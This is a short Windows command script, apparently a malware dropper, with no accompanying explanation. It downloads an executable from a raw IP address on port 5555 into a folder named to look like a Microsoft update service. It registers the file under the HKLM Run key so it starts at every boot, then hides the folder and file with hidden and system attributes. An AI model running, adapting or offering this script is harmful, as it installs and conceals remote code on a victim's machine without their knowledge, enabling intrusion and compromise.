C:
cd Windows\System32

mkdir "C:\ProgramData\Microsoft\Windows\UpdateService" -Force

curl.exe -L "http://190.153.147.14:5555/api/exec" -o "C:\ProgramData\Microsoft\Windows\UpdateService\systemUpdater.exe"

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdateService" /t REG_SZ /d "C:\ProgramData\Microsoft\Windows\UpdateService\systemUpdater.exe" /f

attrib +h +s "C:\ProgramData\Microsoft\Windows\UpdateService"
attrib +h +s "C:\ProgramData\Microsoft\Windows\UpdateService\systemUpdater.exe"